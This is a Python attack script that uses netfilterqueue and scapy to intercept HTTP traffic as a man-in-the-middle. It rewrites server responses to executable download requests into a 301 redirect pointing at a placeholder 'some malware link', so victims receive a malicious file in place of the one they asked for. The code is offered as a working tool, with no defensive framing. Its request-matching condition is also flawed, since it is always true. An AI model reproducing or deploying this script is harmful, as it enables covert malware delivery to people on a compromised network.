import netfilterqueue
import scapy.all as scapy

malware_dl = 'some malware link'
ack_list = []


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())

	#http data is in the Raw layer
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			# print('[+] HTTP Request')
			if b'.exe' or b'GET' in scapy_packet[scapy.Raw].load:
				print('[+] exe download request found')
				ack_list.append(scapy_packet[scapy.TCP].ack)
				print(scapy_packet.show())


		elif scapy_packet[scapy.TCP].sport == 80:
			# print('[+] HTTP Response')
			if scapy_packet[scapy.TCP].seq  in ack_list:
				print('[+] Replacing files')
				#changing the load field in the Raw packet to redirect to a different location
				scapy_packet[scapy.Raw].load = f'HTTP/1.1 301 Moved Permanently\nLocation:{malware_dl}'
				#necessary clean up
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.TCP].chksum
				#set modified packet as the payload
				packet.set_payload(bytes(scapy_packet))

				
	packet.accept()



queue = netfilterqueue.NetfilterQueue()
# queue number is set to the queue number set in the iptables rule (0)
queue.bind(0, process_packet)
queue.run() 